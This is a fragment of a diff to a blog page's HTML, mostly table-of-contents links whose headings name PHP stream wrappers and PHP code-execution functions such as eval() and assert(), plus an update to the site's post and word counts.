href="#2%E3%80%81php-filter"><span class="nav-text">2、php:&#x2F;&#x2F;filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81zip"><span class="nav-text">3、zip:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81phar"><span class="nav-text">4、phar:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81data"><span class="nav-text">5、data:&#x2F;&#x2F;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">PHP代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="nav-text">漏洞函数</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#eval"><span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#assert"><span class="nav-text">assert()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#call-user-func"><span class="nav-text">call_user_func()</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol></li></ol>
 
     </div>
 </div>
@@ -1098,11 +1171,11 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        56 posts in total
+                        57 posts in total
                     </span>
                     
                         <span>
-                            39.6k words in total
+                            43.8k words in total
                         </span>
                     
                 </p>
